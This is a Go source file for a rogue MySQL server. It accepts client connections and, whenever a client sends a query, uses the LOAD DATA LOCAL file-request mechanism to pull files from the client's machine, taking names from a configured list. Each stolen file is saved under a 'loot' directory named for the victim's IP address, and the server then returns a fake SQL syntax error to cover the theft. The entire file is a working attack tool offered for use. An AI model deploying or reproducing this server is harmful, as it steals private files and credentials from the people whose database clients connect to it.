package main

import (
	"crypto/sha1"
	"encoding/hex"
	"fmt"
	"github.com/prometheus/common/log"
	"gopkg.in/yaml.v2"
	"io/ioutil"
	"os"
	"rogue_mysql_server/mysql"
	"strings"
	"sync"
	"time"
	"vitess.io/vitess/go/sqltypes"
)

type DB struct {
	listener *mysql.Listener
	Handler  mysql.Handler

	mapLock   sync.Mutex
	fileIndex map[uint32]int
	config    Config
}

type Config struct {
	Lhost    string   `yaml:"lhost"`
	Lport    string   `yaml:"lport"`
	FileList []string `yaml:"filelist"`
	Auth     bool     `yaml:"auth"`
	Username string   `yaml:"username"`
	Password string   `yaml:"password"`
}

func NativePassword(password string) string {
	if len(password) == 0 {
		return ""
	}

	hash := sha1.New()
	hash.Write([]byte(password))
	s1 := hash.Sum(nil)

	hash.Reset()
	hash.Write(s1)
	s2 := hash.Sum(nil)

	s := strings.ToUpper(hex.EncodeToString(s2))

	return fmt.Sprintf("*%s", s)
}

func main() {
	config := Config{}
	configData, err := ioutil.ReadFile("./config.yaml")

	if err != nil {
		log.Errorf("Config read error %s", err)
	}
	err = yaml.Unmarshal(configData, &config)

	if err != nil {
		log.Errorf("Config parse error: %s", err)
	}

	db := &DB{}
	db.fileIndex = make(map[uint32]int)
	db.Handler = db
	db.config = config

	var authServer mysql.AuthServer
	if config.Auth {
		config.Password = NativePassword(config.Password)

		authServerStatic := mysql.NewAuthServerStatic()
		authServerStatic.Entries[config.Username] = []*mysql.AuthServerStaticEntry{
			{
				MysqlNativePassword: config.Password,
				Password:            config.Password,
			},
		}
		authServer = authServerStatic
	} else {
		authServer = &mysql.AuthServerNone{}
	}

	db.listener, err = mysql.NewListener("tcp", fmt.Sprintf("%s:%s", config.Lhost, config.Lport), authServer, db, 0, 0)
	if err != nil {
		log.Errorf("NewListener failed: %s", err)
	}

	db.listener.Accept()
}

//
// mysql.Handler interface
//

// NewConnection is part of the mysql.Handler interface.
func (db *DB) NewConnection(c *mysql.Conn) {
	log.Infof("New connection from [%s], ID [%d]", c.RemoteAddr(), c.ConnectionID)
	db.mapLock.Lock()
	db.fileIndex[c.ConnectionID] = 0
	db.mapLock.Unlock()
}

// ConnectionClosed is part of the mysql.Handler interface.
func (db *DB) ConnectionClosed(c *mysql.Conn) {
	log.Infof("Connection closed, Addr [%s], ID [%d]", c.RemoteAddr(), c.ConnectionID)
	db.mapLock.Lock()
	delete(db.fileIndex, c.ConnectionID)
	db.mapLock.Unlock()
}

// ComQuery is part of the mysql.Handler interface.
func (db *DB) ComQuery(c *mysql.Conn, query string, callback func(*sqltypes.Result) error) error {
	length := len(db.config.FileList)
	if length == 0 {
		return nil
	} else {
		filename := db.config.FileList[db.fileIndex[c.ConnectionID]]
		db.mapLock.Lock()
		db.fileIndex[c.ConnectionID] = (db.fileIndex[c.ConnectionID] + 1) % length
		db.mapLock.Unlock()
		data := c.RequestFile(filename)
		log.Infof("Now try to read [%s] from [%s]", filename, c.RemoteAddr())

		if data == nil || len(data) == 0 {
			log.Infof("Read failed, file may not exist in client")
		} else {
			path := fmt.Sprintf("./loot/%s", strings.Split(c.RemoteAddr().String(), ":")[0])
			os.Mkdir(path, 0744)
			filename := strings.Split(filename, "/")
			filename = filename[len(filename)-1:]
			filepath := fmt.Sprintf("%s/%v-%s", path, time.Now().Unix(), filename[0])
			ioutil.WriteFile(filepath, data, 0644)
			log.Infof("Read success, stored at [%s]", filepath)
		}

		c.WriteErrorResponse(fmt.Sprintf("You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%s' at line 1", query))
		return nil
	}
}

// WarningCount is part of the mysql.Handler interface.
func (db *DB) WarningCount(c *mysql.Conn) uint16 {
	return 0
}
